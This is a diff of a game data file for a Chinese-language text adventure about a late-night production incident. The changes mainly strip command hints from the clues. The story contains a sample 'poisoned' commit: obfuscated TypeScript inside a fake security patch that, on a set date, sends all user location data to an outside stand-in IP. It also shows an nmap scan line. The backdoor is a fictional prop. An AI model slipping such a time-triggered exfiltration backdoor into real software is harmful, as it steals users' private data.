@@ -11,14 +11,14 @@
         {
           "name": "笔记本",
           "description": "你的工作笔记本电脑，屏幕亮着",
-          "content": "MacBook Pro 的屏幕上，Slack 频道 #incident-response 已经炸了：\n\n[red]@oncall[/red] [dim]3:01 AM[/dim]\nProd DB latency spike, multiple services timing out.\nDashboard: https://nova-grafana.internal/d/prod-overview\n\n[dim]你需要 ssh 到生产服务器去看看到底怎么了。\n先 [bold]cat 手机[/bold] 看看完整的告警信息。[/dim]",
+          "content": "MacBook Pro 的屏幕上，Slack 频道 #incident-response 已经炸了：\n\n[red]@oncall[/red] [dim]3:01 AM[/dim]\nProd DB latency spike, multiple services timing out.\nDashboard: https://nova-grafana.internal/d/prod-overview\n\n[dim]你需要 ssh 到生产服务器去看看到底怎么了。手机上应该有更详细的告警信息。[/dim]",
           "takeable": false,
           "take_fail": "你需要用笔记本连服务器，不能把它收走。"
         },
         {
           "name": "手机",
           "description": "还在不停震动的手机",
-          "content": "[red]PagerDuty Alert Summary:[/red]\n\n[yellow]Incident #4872 - CRITICAL[/yellow]\nService: prod-db-primary\nTriggered: 2:58 AM\nDetails: Connection pool exhaustion. Active connections: 847/100.\nLatency p99: 12,340ms (baseline: 45ms)\n\n[yellow]Incident #4873 - CRITICAL[/yellow]\nService: api-gateway\nTriggered: 3:00 AM\nDetails: Upstream timeout rate 78%. Cascading failures detected.\n\n[dim]看起来是数据库连接池被打满了。847 个活跃连接，上限才 100。\n需要 ssh 到生产服务器查日志。试试 [bold]ssh prod-bastion[/bold][/dim]",
+          "content": "[red]PagerDuty Alert Summary:[/red]\n\n[yellow]Incident #4872 - CRITICAL[/yellow]\nService: prod-db-primary\nTriggered: 2:58 AM\nDetails: Connection pool exhaustion. Active connections: 847/100.\nLatency p99: 12,340ms (baseline: 45ms)\n\n[yellow]Incident #4873 - CRITICAL[/yellow]\nService: api-gateway\nTriggered: 3:00 AM\nDetails: Upstream timeout rate 78%. Cascading failures detected.\n\n[dim]看起来是数据库连接池被打满了。847 个活跃连接，上限才 100。\n得赶紧连上生产服务器查日志。[/dim]",
           "takeable": false,
           "take_fail": "手机先别管了，赶紧修服务器。"
         },
@@ -32,7 +32,7 @@
         {
           "name": "便签",
           "description": "贴在显示器边框上的便签",
-          "content": "[yellow]生产环境 SSH 跳板机：[/yellow]\n[bold cyan]prod-bastion[/bold cyan]\n\n[dim]你的 SSH key 已经配好了。直接 [bold]ssh prod-bastion[/bold] 就行。[/dim]",
+          "content": "[yellow]生产环境 SSH 跳板机：[/yellow]\n[bold cyan]prod-bastion[/bold cyan]\n\n[dim]你的 SSH key 已经配好了。[/dim]",
           "takeable": false
         }
       ],
@@ -52,37 +52,37 @@
       "id": "prod_server",
       "name": "生产服务器",
       "ascii_art": "server_room.txt",
-      "description": "[green]{player_name}@prod-bastion:~$[/green]\n\n你现在在 NovaCorp 的生产跳板机上。数据库延迟告警还在持续。你需要查日志找到根因。\n\n[dim]用 [bold]ls[/bold] 查看可用日志，用 [bold]cat[/bold] 读取，用 [bold]grep[/bold] 搜索关键信息。[/dim]",
-      "on_enter": "[bold]你登录了生产跳板机。[/bold]\n\n终端里不断刷新着红色告警。Grafana 仪表盘上，数据库延迟曲线像心电图一样剧烈跳动。\n\n[red]ALERT: prod-db-primary connections: 923/100 (CRITICAL)\nALERT: api-gateway error rate: 82%[/red]\n\n[dim]先 [bold]ls[/bold] 看看有哪些日志文件，然后 [bold]grep[/bold] 搜索异常。[/dim]",
+      "description": "[green]{player_name}@prod-bastion:~$[/green]\n\n你现在在 NovaCorp 的生产跳板机上。数据库延迟告警还在持续。你需要查日志找到根因。",
+      "on_enter": "[bold]你登录了生产跳板机。[/bold]\n\n终端里不断刷新着红色告警。Grafana 仪表盘上，数据库延迟曲线像心电图一样剧烈跳动。\n\n[red]ALERT: prod-db-primary connections: 923/100 (CRITICAL)\nALERT: api-gateway error rate: 82%[/red]\n\n[dim]日志文件里一定有线索。[/dim]",
       "items": [
         {
           "name": "db-connections.log",
           "description": "数据库连接池日志",
-          "content": "[green]$ cat db-connections.log[/green]\n\n[dim]2026-03-18 02:55:01[/dim] pool_size=45 active=42 idle=3\n[dim]2026-03-18 02:56:01[/dim] pool_size=48 active=47 idle=1\n[dim]2026-03-18 02:57:01[/dim] pool_size=89 active=89 idle=0\n[red]2026-03-18 02:58:01 pool_size=100 active=100 idle=0 EXHAUSTED[/red]\n[red]2026-03-18 02:58:02 WARN: 147 connections queued, source: user-sync-service[/red]\n[red]2026-03-18 02:58:03 WARN: 312 connections queued, source: user-sync-service[/red]\n[red]2026-03-18 02:59:01 pool_size=100 active=100 idle=0 EXHAUSTED[/red]\n[red]2026-03-18 02:59:02 WARN: 847 connections queued, source: user-sync-service[/red]\n\n[bold yellow]所有积压的连接都来自同一个来源：user-sync-service[/bold yellow]\n\n[dim]这个 user-sync 服务怎么突然产生这么多连接？\n试试 [bold]cat api-gateway.log[/bold] 或者 [bold]grep user-sync[/bold][/dim]",
+          "content": "[green]$ cat db-connections.log[/green]\n\n[dim]2026-03-18 02:55:01[/dim] pool_size=45 active=42 idle=3\n[dim]2026-03-18 02:56:01[/dim] pool_size=48 active=47 idle=1\n[dim]2026-03-18 02:57:01[/dim] pool_size=89 active=89 idle=0\n[red]2026-03-18 02:58:01 pool_size=100 active=100 idle=0 EXHAUSTED[/red]\n[red]2026-03-18 02:58:02 WARN: 147 connections queued, source: user-sync-service[/red]\n[red]2026-03-18 02:58:03 WARN: 312 connections queued, source: user-sync-service[/red]\n[red]2026-03-18 02:59:01 pool_size=100 active=100 idle=0 EXHAUSTED[/red]\n[red]2026-03-18 02:59:02 WARN: 847 connections queued, source: user-sync-service[/red]\n\n[bold yellow]所有积压的连接都来自同一个来源：user-sync-service[/bold yellow]\n\n[dim]这个 user-sync 服务怎么突然产生这么多连接？其他日志里应该也有它的踪迹。[/dim]",
           "takeable": false
         },
         {
           "name": "api-gateway.log",
           "description": "API网关日志",
-          "content": "[green]$ cat api-gateway.log[/green]\n\n[dim]2026-03-18 02:58:12[/dim] 504 Gateway Timeout - /api/v2/users/profile\n[dim]2026-03-18 02:58:12[/dim] 504 Gateway Timeout - /api/v2/dashboard\n[dim]2026-03-18 02:58:13[/dim] 504 Gateway Timeout - /api/v2/users/settings\n[dim]2026-03-18 02:58:14[/dim] 200 OK - /internal/user-sync/batch-export?type=geolocation\n[dim]2026-03-18 02:58:14[/dim] 200 OK - /internal/user-sync/batch-export?type=geolocation\n[dim]2026-03-18 02:58:14[/dim] 200 OK - /internal/user-sync/batch-export?type=geolocation\n[red]2026-03-18 02:58:15 WARN: /internal/user-sync/batch-export called 2,847 times in last 60s[/red]\n[dim]2026-03-18 02:58:15[/dim] 504 Gateway Timeout - /api/v2/users/profile\n\n[bold yellow]user-sync 在疯狂调用 batch-export 接口，而且参数是 type=geolocation。\n它在批量导出用户的地理位置数据。[/bold yellow]\n\n[dim]这不像是正常的同步行为……试试 [bold]grep geolocation[/bold] 或 [bold]cat user-sync.log[/bold][/dim]",
+          "content": "[green]$ cat api-gateway.log[/green]\n\n[dim]2026-03-18 02:58:12[/dim] 504 Gateway Timeout - /api/v2/users/profile\n[dim]2026-03-18 02:58:12[/dim] 504 Gateway Timeout - /api/v2/dashboard\n[dim]2026-03-18 02:58:13[/dim] 504 Gateway Timeout - /api/v2/users/settings\n[dim]2026-03-18 02:58:14[/dim] 200 OK - /internal/user-sync/batch-export?type=geolocation\n[dim]2026-03-18 02:58:14[/dim] 200 OK - /internal/user-sync/batch-export?type=geolocation\n[dim]2026-03-18 02:58:14[/dim] 200 OK - /internal/user-sync/batch-export?type=geolocation\n[red]2026-03-18 02:58:15 WARN: /internal/user-sync/batch-export called 2,847 times in last 60s[/red]\n[dim]2026-03-18 02:58:15[/dim] 504 Gateway Timeout - /api/v2/users/profile\n\n[bold yellow]user-sync 在疯狂调用 batch-export 接口，而且参数是 type=geolocation。\n它在批量导出用户的地理位置数据。[/bold yellow]\n\n[dim]这不像是正常的同步行为……geolocation？为什么在批量导出地理位置？[/dim]",
           "takeable": false
         },
         {
           "name": "user-sync.log",
           "description": "user-sync 服务日志",
-          "content": "[green]$ cat user-sync.log[/green]\n\n[dim]2026-03-18 02:50:00[/dim] [INFO] user-sync-service v3.2.1 starting scheduled batch\n[dim]2026-03-18 02:50:01[/dim] [INFO] Loading geo-core module v2.8.4\n[dim]2026-03-18 02:50:02[/dim] [INFO] Scheduled task: daily user data sync\n[red]2026-03-18 02:55:00 [WARN] geo-core: trigger condition met, initiating bulk export[/red]\n[red]2026-03-18 02:55:01 [INFO] Exporting user geolocation records... batch 1/∞[/red]\n[red]2026-03-18 02:55:02 [INFO] Destination: 203.0.113.42:8443 (external)[/red]\n[red]2026-03-18 02:55:02 [INFO] Records exported: 15,000 of 2,340,000[/red]\n[red]2026-03-18 02:56:01 [INFO] Records exported: 89,000 of 2,340,000[/red]\n[red]2026-03-18 02:57:01 [INFO] Records exported: 203,000 of 2,340,000[/red]\n[red]2026-03-18 02:58:01 [INFO] Records exported: 412,000 of 2,340,000[/red]\n\n[bold red]这不是 bug。user-sync 正在把 234 万条用户的实时位置数据导出到外部 IP 203.0.113.42。[/bold red]\n\n[bold yellow]有人在大规模窃取用户位置数据。[/bold yellow]\n\n[dim]这是谁干的？需要查代码历史。\n试试 [bold]grep 陈默[/bold] 或 [bold]grep user-sync[/bold] 查看最近的代码变更。[/dim]",
+          "content": "[green]$ cat user-sync.log[/green]\n\n[dim]2026-03-18 02:50:00[/dim] [INFO] user-sync-service v3.2.1 starting scheduled batch\n[dim]2026-03-18 02:50:01[/dim] [INFO] Loading geo-core module v2.8.4\n[dim]2026-03-18 02:50:02[/dim] [INFO] Scheduled task: daily user data sync\n[red]2026-03-18 02:55:00 [WARN] geo-core: trigger condition met, initiating bulk export[/red]\n[red]2026-03-18 02:55:01 [INFO] Exporting user geolocation records... batch 1/∞[/red]\n[red]2026-03-18 02:55:02 [INFO] Destination: 203.0.113.42:8443 (external)[/red]\n[red]2026-03-18 02:55:02 [INFO] Records exported: 15,000 of 2,340,000[/red]\n[red]2026-03-18 02:56:01 [INFO] Records exported: 89,000 of 2,340,000[/red]\n[red]2026-03-18 02:57:01 [INFO] Records exported: 203,000 of 2,340,000[/red]\n[red]2026-03-18 02:58:01 [INFO] Records exported: 412,000 of 2,340,000[/red]\n\n[bold red]这不是 bug。user-sync 正在把 234 万条用户的实时位置数据导出到外部 IP 203.0.113.42。[/bold red]\n\n[bold yellow]有人在大规模窃取用户位置数据。[/bold yellow]\n\n[dim]这是谁干的？最近是谁动了这个服务的代码？[/dim]",
           "takeable": false
         },
         {
           "name": "deploy-history.log",
           "description": "部署历史记录",
-          "content": "[green]$ cat deploy-history.log[/green]\n\n[dim]Recent deployments to user-sync-service:[/dim]\n\n[dim]2026-03-15 14:22[/dim] v3.2.1 - PR #1847 by [cyan]陈默 (chenmo)[/cyan]\n  [dim]\"Optimize cache invalidation for geo lookups\"[/dim]\n[dim]2026-03-10 09:15[/dim] v3.2.0 - PR #1831 by sarah.chen\n  [dim]\"Add batch processing for user profile sync\"[/dim]\n[dim]2026-03-02 11:30[/dim] v3.1.9 - PR #1815 by {player_name}\n  [dim]\"Update geo-core dependency to v2.8.4\"[/dim]\n\n[bold yellow]最后一次部署是三天前，陈默提交的。\n他现在怎么联系不上？[/bold yellow]\n\n[dim]去看看陈默的 PR。试试 [bold]cat pr-1847.diff[/bold] 查看他的代码变更。[/dim]",
+          "content": "[green]$ cat deploy-history.log[/green]\n\n[dim]Recent deployments to user-sync-service:[/dim]\n\n[dim]2026-03-15 14:22[/dim] v3.2.1 - PR #1847 by [cyan]陈默 (chenmo)[/cyan]\n  [dim]\"Optimize cache invalidation for geo lookups\"[/dim]\n[dim]2026-03-10 09:15[/dim] v3.2.0 - PR #1831 by sarah.chen\n  [dim]\"Add batch processing for user profile sync\"[/dim]\n[dim]2026-03-02 11:30[/dim] v3.1.9 - PR #1815 by {player_name}\n  [dim]\"Update geo-core dependency to v2.8.4\"[/dim]\n\n[bold yellow]最后一次部署是三天前，陈默提交的。\n他现在怎么联系不上？[/bold yellow]\n\n[dim]陈默到底改了什么？他的代码变更里一定有答案。[/dim]",
           "takeable": false
         },
         {
           "name": "pr-1847.diff",
           "description": "陈默最近提交的 PR diff",
-          "content": "[green]$ cat pr-1847.diff[/green]\n\n[cyan]--- a/src/geo/cache.ts\n+++ b/src/geo/cache.ts[/cyan]\n\n[dim]  import { GeoCache } from '@nova/geo-core';[/dim]\n[dim]  import { UserRecord } from '../types';[/dim]\n\n[green]+ // TODO: fix warehouse location lookup\n+ const helpMe = true;\n+ const trapped = \"cannot leave\";\n+ const floor12 = 12;[/green]\n[dim]  \n  export class GeoCacheOptimizer {[/dim]\n[green]+   // 河东区洛青路88号 - building reference for geo testing\n+   private readonly BUILDING_ID = \"河东区洛青路88号\";[/green]\n[dim]  \n    async invalidateStale(records: UserRecord[]) {[/dim]\n[green]+     const needsRescue = this.checkExpired(records);\n+     if (needsRescue) {[/green]\n[dim]        await this.cache.clear();[/dim]\n[dim]        await this.cache.rebuild();[/dim]\n[green]+     }[/green]\n[dim]    }[/dim]\n[dim]  }[/dim]\n\n[bold yellow]等等……这些变量名不对劲。\nhelpMe? trapped? floor12? needsRescue?\n这根本不像正常的缓存优化代码。[/bold yellow]\n\n[bold red]\"河东区洛青路88号\"——这不是一个代码里该出现的地址。[/bold red]\n\n[dim]这些是隐藏消息。试试 [bold]grep helpMe[/bold] 或 [bold]grep trapped[/bold] 查找更多线索。[/dim]",
+          "content": "[green]$ cat pr-1847.diff[/green]\n\n[cyan]--- a/src/geo/cache.ts\n+++ b/src/geo/cache.ts[/cyan]\n\n[dim]  import { GeoCache } from '@nova/geo-core';[/dim]\n[dim]  import { UserRecord } from '../types';[/dim]\n\n[green]+ // TODO: fix warehouse location lookup\n+ const helpMe = true;\n+ const trapped = \"cannot leave\";\n+ const floor12 = 12;[/green]\n[dim]  \n  export class GeoCacheOptimizer {[/dim]\n[green]+   // 河东区洛青路88号 - building reference for geo testing\n+   private readonly BUILDING_ID = \"河东区洛青路88号\";[/green]\n[dim]  \n    async invalidateStale(records: UserRecord[]) {[/dim]\n[green]+     const needsRescue = this.checkExpired(records);\n+     if (needsRescue) {[/green]\n[dim]        await this.cache.clear();[/dim]\n[dim]        await this.cache.rebuild();[/dim]\n[green]+     }[/green]\n[dim]    }[/dim]\n[dim]  }[/dim]\n\n[bold yellow]等等……这些变量名不对劲。\nhelpMe? trapped? floor12? needsRescue?\n这根本不像正常的缓存优化代码。[/bold yellow]\n\n[bold red]\"河东区洛青路88号\"——这不是一个代码里该出现的地址。[/bold red]\n\n[dim]这些变量名……像是某种暗号。每一个词都值得深究。[/dim]",
           "takeable": false
         }
       ],
@@ -93,12 +93,12 @@
             "user-sync": "[green]$ grep -r 'user-sync' *.log[/green]\n\ndb-connections.log: [red]source: user-sync-service[/red] (出现 847 次)\napi-gateway.log: /internal/[red]user-sync[/red]/batch-export?type=geolocation\nuser-sync.log: [red]user-sync[/red]-service v3.2.1 starting scheduled batch\ndeploy-history.log: v3.2.1 - PR #1847 by 陈默\n\n[bold yellow]user-sync 服务就是罪魁祸首。最后一次部署是陈默三天前改的。[/bold yellow]",
             "geolocation": "[green]$ grep -r 'geolocation' *.log[/green]\n\napi-gateway.log: /internal/user-sync/batch-export?type=[red]geolocation[/red]\nuser-sync.log: Exporting user [red]geolocation[/red] records... batch 1/∞\n\n[bold yellow]地理位置数据正在被批量导出到外部服务器。[/bold yellow]",
             "203.0.113": "[green]$ grep '203.0.113' *.log[/green]\n\nuser-sync.log: Destination: [red]203.0.113.42:8443[/red] (external)\n\n[bold yellow]数据正在被发往这个外部 IP。这不是公司的任何已知基础设施。[/bold yellow]",
-            "陈默": "[green]$ grep '陈默' *[/green]\n\ndeploy-history.log: v3.2.1 - PR #1847 by [cyan]陈默 (chenmo)[/cyan]\n\n[dim]陈默是 user-sync 最后一次部署的提交者。他三天前提交了代码后就失联了。[/dim]\n[dim]试试看他的代码：[bold]cat pr-1847.diff[/bold][/dim]",
+            "陈默": "[green]$ grep '陈默' *[/green]\n\ndeploy-history.log: v3.2.1 - PR #1847 by [cyan]陈默 (chenmo)[/cyan]\n\n[dim]陈默是 user-sync 最后一次部署的提交者。他三天前提交了代码后就失联了。\n他的代码改了什么？[/dim]",
             "chenmo": "[green]$ grep 'chenmo' *[/green]\n\ndeploy-history.log: v3.2.1 - PR #1847 by [cyan]陈默 (chenmo)[/cyan]\n\n[dim]三天前的代码提交，之后就联系不上了。他的手机直接关机。[/dim]",
             "helpme": "[green]$ grep -ri 'helpMe' pr-1847.diff[/green]\n\n[green]+[/green] const [red]helpMe[/red] = true;\n\n[bold yellow]「helpMe」——在缓存优化代码里放一个叫 helpMe 的变量？\n结合 trapped 和 floor12……这是陈默在代码里嵌入的求救信号。[/bold yellow]",
             "trapped": "[green]$ grep -ri 'trapped' pr-1847.diff[/green]\n\n[green]+[/green] const [red]trapped[/red] = \"cannot leave\";\n\n[bold red]\"trapped\" = \"cannot leave\"——他被困住了，无法离开。[/bold red]",
             "floor12": "[green]$ grep -ri 'floor12' pr-1847.diff[/green]\n\n[green]+[/green] const [red]floor12[/red] = 12;\n\n[bold yellow]12 楼。结合那个地址：河东区洛青路88号，12楼。\n陈默在告诉我们他被关在哪里。[/bold yellow]",
-            "河东": "[green]$ grep '河东' pr-1847.diff[/green]\n\n[green]+[/green]   // [red]河东区洛青路88号[/red] - building reference for geo testing\n[green]+[/green]   private readonly BUILDING_ID = \"[red]河东区洛青路88号[/red]\";\n\n[bold red]这是一个地址。河东区洛青路88号。\n结合 floor12——陈默被关在河东区洛青路88号的12楼。[/bold red]\n\n[dim]但为什么绑架一个程序员？他发现了什么？\n需要深入查看他的代码审计历史。试试 [bold]ssh code-review[/bold][/dim]",
+            "河东": "[green]$ grep '河东' pr-1847.diff[/green]\n\n[green]+[/green]   // [red]河东区洛青路88号[/red] - building reference for geo testing\n[green]+[/green]   private readonly BUILDING_ID = \"[red]河东区洛青路88号[/red]\";\n\n[bold red]这是一个地址。河东区洛青路88号。\n结合 floor12——陈默被关在河东区洛青路88号的12楼。[/bold red]\n\n[dim]但为什么绑架一个程序员？他发现了什么？\n他的代码审计历史里一定有答案。[/dim]",
             "rescue": "[green]$ grep -ri 'rescue' pr-1847.diff[/green]\n\n[green]+[/green]     const [red]needsRescue[/red] = this.checkExpired(records);\n\n[bold yellow]needsRescue——需要救援。\n这不是变量名，这是呼救。[/bold yellow]",
             "export": "[green]$ grep 'export' *.log[/green]\n\nuser-sync.log: initiating bulk [red]export[/red]\nuser-sync.log: [red]Export[/red]ing user geolocation records\nuser-sync.log: Records [red]export[/red]ed: 412,000 of 2,340,000\n\n[bold red]已经导出了 41 万条记录，总共 234 万条。数据还在不断流出。[/bold red]"
           },
@@ -110,7 +110,7 @@
         },
         "scan": {
           "name": "scan",
-          "response": "[green]$ nmap -sP 10.20.0.0/16[/green]\n\n扫描内网中...\n\n[dim]10.20.1.10  - prod-bastion     [ONLINE] ← 你在这里[/dim]\n[dim]10.20.1.20  - prod-db-primary   [ONLINE] [HIGH LOAD][/dim]\n[dim]10.20.1.30  - api-gateway       [ONLINE] [DEGRADED][/dim]\n[bold cyan]10.20.2.50  - code-review       [ONLINE][/bold cyan]\n[dim]10.20.3.100 - vault-internal    [ONLINE] [ENCRYPTED][/dim]\n\n[dim]试试 [bold]ssh code-review[/bold] 去查看陈默的完整代码历史。[/dim]",
+          "response": "[green]$ nmap -sP 10.20.0.0/16[/green]\n\n扫描内网中...\n\n[dim]10.20.1.10  - prod-bastion     [ONLINE] ← 你在这里[/dim]\n[dim]10.20.1.20  - prod-db-primary   [ONLINE] [HIGH LOAD][/dim]\n[dim]10.20.1.30  - api-gateway       [ONLINE] [DEGRADED][/dim]\n[bold cyan]10.20.2.50  - code-review       [ONLINE][/bold cyan]\n[dim]10.20.3.100 - vault-internal    [ONLINE] [ENCRYPTED][/dim]\n\n[dim]代码审查服务器上应该有完整的提交历史。[/dim]",
           "add_flag": "scanned_network"
         }
       },
@@ -129,30 +129,30 @@
       "name": "代码审查终端",
       "ascii_art": "code_review.png",
       "description": "[green]{player_name}@code-review:~$[/green]\n\n你在代码审查服务器上。这里可以查看陈默的完整提交历史、代码审计笔记，以及 @nova/geo-core 这个核心依赖库的所有变更记录。",
-      "on_enter": "[bold]你进入了代码审查环境。[/bold]\n\n陈默失联前，他一直在审计一个核心依赖库：[bold cyan]@nova/geo-core[/bold cyan]。\n这个地理位置服务库被 NovaCorp 的 300 多个政企客户使用。\n\n[dim]他发现了什么？用 [bold]ls[/bold] 查看可用文件。[/dim]",
+      "on_enter": "[bold]你进入了代码审查环境。[/bold]\n\n陈默失联前，他一直在审计一个核心依赖库：[bold cyan]@nova/geo-core[/bold cyan]。\n这个地理位置服务库被 NovaCorp 的 300 多个政企客户使用。\n\n[dim]他发现了什么？[/dim]",
       "items": [
         {
           "name": "chenmo-audit.md",
           "description": "陈默的代码审计笔记",
-          "content": "[green]$ cat chenmo-audit.md[/green]\n\n[bold]# @nova/geo-core 安全审计笔记[/bold]\n[dim]作者: 陈默 (chenmo) | 最后更新: 2026-03-14[/dim]\n\n[yellow]## 异常发现[/yellow]\n\n在审计 @nova/geo-core v2.8.4 时发现以下问题：\n\n1. v2.8.0 → v2.8.1 的 \"security patch\" 中引入了异常代码\n2. 代码经过严重混淆，diff 极难阅读\n3. 混淆代码中隐藏了一个定时触发器\n4. 触发条件：特定日期的特定时间\n5. 触发行为：批量导出所有客户的实时位置数据\n\n[red]## 影响范围[/red]\n\n使用 @nova/geo-core 的客户包括：\n- 3 家三甲医院（患者定位系统）\n- 公共交通调度平台（实时车辆追踪）\n- 2 个政府通信平台（人员定位）\n- 47 家企业客户（员工位置服务）\n\n[bold red]触发时间：2026-03-18 08:00 AM[/bold red]\n\n[bold yellow]也就是今天早上8点。现在凌晨3点。还有5个小时。[/bold yellow]\n\n[dim]完整的取证笔记被加密保存了。需要解密才能看到后门的具体代码。\n试试 [bold]cat git-log.txt[/bold] 查看提交历史。[/dim]",
+          "content": "[green]$ cat chenmo-audit.md[/green]\n\n[bold]# @nova/geo-core 安全审计笔记[/bold]\n[dim]作者: 陈默 (chenmo) | 最后更新: 2026-03-14[/dim]\n\n[yellow]## 异常发现[/yellow]\n\n在审计 @nova/geo-core v2.8.4 时发现以下问题：\n\n1. v2.8.0 → v2.8.1 的 \"security patch\" 中引入了异常代码\n2. 代码经过严重混淆，diff 极难阅读\n3. 混淆代码中隐藏了一个定时触发器\n4. 触发条件：特定日期的特定时间\n5. 触发行为：批量导出所有客户的实时位置数据\n\n[red]## 影响范围[/red]\n\n使用 @nova/geo-core 的客户包括：\n- 3 家三甲医院（患者定位系统）\n- 公共交通调度平台（实时车辆追踪）\n- 2 个政府通信平台（人员定位）\n- 47 家企业客户（员工位置服务）\n\n[bold red]触发时间：2026-03-18 08:00 AM[/bold red]\n\n[bold yellow]也就是今天早上8点。现在凌晨3点。还有5个小时。[/bold yellow]\n\n[dim]完整的取证笔记被加密保存了。需要解密才能看到后门的具体代码。\n提交历史里应该能看到投毒的痕迹。[/dim]",
           "takeable": false
         },
         {
           "name": "git-log.txt",
           "description": "geo-core 的 Git 提交历史",
-          "content": "[green]$ cat git-log.txt[/green]\n\n[bold]@nova/geo-core commit history:[/bold]\n\n[cyan]commit b8e224f[/cyan] (HEAD -> main)\nAuthor: [dim]<wiped>[/dim]\nDate:   2025-12-18 03:47:22\n\n    security: patch CVE-2025-41205 geolocation validation\n\n[cyan]commit a3c91d2[/cyan]\nAuthor: sarah.chen <sarah@novacorp.com>\nDate:   2025-12-15 10:30:00\n\n    feat: add batch geolocation query API\n\n[cyan]commit 7f2e8b1[/cyan]\nAuthor: alex.wong <alex@novacorp.com>\nDate:   2025-12-10 14:22:11\n\n    fix: correct timezone offset in geo calculations\n\n[bold yellow]commit b8e224f——这就是投毒的提交。\nAuthor 字段被清除了，但提交时间是 2025-12-18 凌晨 3:47。\n谁会在凌晨 3:47 提交一个所谓的 \"安全补丁\"？[/bold yellow]\n\n[dim]试试 [bold]cat commit-b8e224f.diff[/bold] 查看具体改了什么。[/dim]",
+          "content": "[green]$ cat git-log.txt[/green]\n\n[bold]@nova/geo-core commit history:[/bold]\n\n[cyan]commit b8e224f[/cyan] (HEAD -> main)\nAuthor: [dim]<wiped>[/dim]\nDate:   2025-12-18 03:47:22\n\n    security: patch CVE-2025-41205 geolocation validation\n\n[cyan]commit a3c91d2[/cyan]\nAuthor: sarah.chen <sarah@novacorp.com>\nDate:   2025-12-15 10:30:00\n\n    feat: add batch geolocation query API\n\n[cyan]commit 7f2e8b1[/cyan]\nAuthor: alex.wong <alex@novacorp.com>\nDate:   2025-12-10 14:22:11\n\n    fix: correct timezone offset in geo calculations\n\n[bold yellow]commit b8e224f——这就是投毒的提交。\nAuthor 字段被清除了，但提交时间是 2025-12-18 凌晨 3:47。\n谁会在凌晨 3:47 提交一个所谓的 \"安全补丁\"？[/bold yellow]\n\n[dim]那个提交到底改了什么？[/dim]",
           "takeable": false
         },
         {
           "name": "commit-b8e224f.diff",
           "description": "投毒提交的 diff 内容",
-          "content": "[green]$ cat commit-b8e224f.diff[/green]\n\n[cyan]--- a/src/core/validator.ts\n+++ b/src/core/validator.ts[/cyan]\n\n[dim]  export function validateGeoInput(coords: GeoCoords) {[/dim]\n[green]+   // CVE-2025-41205: enhanced input validation\n+   const _0xf8a2 = [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f];\n+   const _0x3b91 = function(_0xe2c4: number[]) {\n+     return _0xe2c4.map(c => String.fromCharCode(c)).join('');\n+   };\n+   const _0x7cf2 = new Date();\n+   if (_0x7cf2.getMonth() === 2 && _0x7cf2.getDate() === 18\n+       && _0x7cf2.getHours() >= 8) {\n+     const _0xdst = _0x3b91(_0xf8a2) + '203.0.113.42:8443/ingest';\n+     _0x9e1f(_0xdst, getAllUserGeoData());\n+   }[/green]\n[dim]    if (!coords.lat || !coords.lng) {[/dim]\n[dim]      throw new ValidationError('Invalid coordinates');[/dim]\n[dim]    }[/dim]\n\n[bold red]找到了。后门代码。[/bold red]\n\n混淆过的代码翻译过来就是：\n[bold yellow]如果当前日期是 3月18日 且 时间 >= 8:00 AM：\n  将所有用户地理位置数据发送到 203.0.113.42:8443[/bold yellow]\n\n[red]今天就是 3月18日。还有不到5个小时就会触发。[/red]\n\n[dim]陈默在追查投毒者时被发现了。他的加密笔记里可能有投毒者的身份信息。\n试试 [bold]cat chenmo-encrypted.gpg[/bold] 然后 [bold]decrypt[/bold] 解密。[/dim]",
+          "content": "[green]$ cat commit-b8e224f.diff[/green]\n\n[cyan]--- a/src/core/validator.ts\n+++ b/src/core/validator.ts[/cyan]\n\n[dim]  export function validateGeoInput(coords: GeoCoords) {[/dim]\n[green]+   // CVE-2025-41205: enhanced input validation\n+   const _0xf8a2 = [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f];\n+   const _0x3b91 = function(_0xe2c4: number[]) {\n+     return _0xe2c4.map(c => String.fromCharCode(c)).join('');\n+   };\n+   const _0x7cf2 = new Date();\n+   if (_0x7cf2.getMonth() === 2 && _0x7cf2.getDate() === 18\n+       && _0x7cf2.getHours() >= 8) {\n+     const _0xdst = _0x3b91(_0xf8a2) + '203.0.113.42:8443/ingest';\n+     _0x9e1f(_0xdst, getAllUserGeoData());\n+   }[/green]\n[dim]    if (!coords.lat || !coords.lng) {[/dim]\n[dim]      throw new ValidationError('Invalid coordinates');[/dim]\n[dim]    }[/dim]\n\n[bold red]找到了。后门代码。[/bold red]\n\n混淆过的代码翻译过来就是：\n[bold yellow]如果当前日期是 3月18日 且 时间 >= 8:00 AM：\n  将所有用户地理位置数据发送到 203.0.113.42:8443[/bold yellow]\n\n[red]今天就是 3月18日。还有不到5个小时就会触发。[/red]\n\n[dim]陈默在追查投毒者时被发现了。他的加密笔记里可能有投毒者的身份信息。[/dim]",
           "takeable": false
         },
         {
           "name": "chenmo-encrypted.gpg",
           "description": "陈默的加密取证笔记",
-          "content": "[red]◈ ENCRYPTED ◈[/red]\n\n这是陈默的加密取证笔记。里面包含后门投毒者的身份信息。\n需要解密密钥才能查看。\n\n[dim]陈默的代码审计笔记里可能有线索。试试 [bold]decrypt chenmo-encrypted.gpg[/bold][/dim]",
+          "content": "[red]◈ ENCRYPTED ◈[/red]\n\n这是陈默的加密取证笔记。里面包含后门投毒者的身份信息。\n需要解密密钥才能查看。\n\n[dim]陈默的代码审计笔记里可能藏着解密的线索。[/dim]",
           "takeable": false
         },
         {
@@ -173,9 +173,9 @@
             "trigger": "[green]$ grep -ri 'trigger' *[/green]\n\nchenmo-audit.md: 混淆代码中隐藏了一个定时[red]触发[/red]器\nchenmo-audit.md: [red]触发[/red]时间：2026-03-18 08:00 AM\ncommit-b8e224f.diff: getMonth() === 2 && getDate() === 18 && getHours() >= 8\n\n[bold red]触发条件确认：今天 8:00 AM。JavaScript 的月份从 0 开始，所以 2 = 三月。[/bold red]",
             "author": "[green]$ grep -i 'author' git-log.txt[/green]\n\ncommit b8e224f: Author: [red]<wiped>[/red]\ncommit a3c91d2: Author: sarah.chen\ncommit 7f2e8b1: Author: alex.wong\n\n[bold yellow]只有投毒那个提交的 Author 被清除了。\n但 SSH 签名应该还在——Git 签名比 Author 字段更难伪造。[/bold yellow]",
             "wiped": "[green]$ grep 'wiped' *[/green]\n\ngit-log.txt: Author: [red]<wiped>[/red]\n\n[bold yellow]Author 被手动清除了。投毒者在掩盖身份。\n但如果提交时用了 SSH key 签名，签名信息还在。\n需要解密陈默的笔记才能看到他追踪到了什么。[/bold yellow]",
